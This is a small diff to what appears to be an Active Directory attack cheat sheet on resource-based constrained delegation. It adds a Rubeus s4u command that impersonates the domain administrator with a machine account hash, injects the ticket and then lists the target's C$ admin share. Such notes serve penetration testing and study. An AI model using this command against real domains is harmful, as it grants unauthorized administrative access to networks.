@@ -201,6 +201,12 @@ Import-Module .\Powermad.ps1
     ---- ----------------------------------------
     <HOSTNAME>   {1, 0, 4, 128...}
     ```
+      
+    ```bash
+      .\Rubeus.exe s4u /user:HOST$ /rc4:rc4ORntml /msdsspn:CIFS/host.domain.com /impersonateuser:administrator /ptt
+      
+       dir \\host.domain.com\C$
+    ````  
 
 2. **Create a New Computer**
 
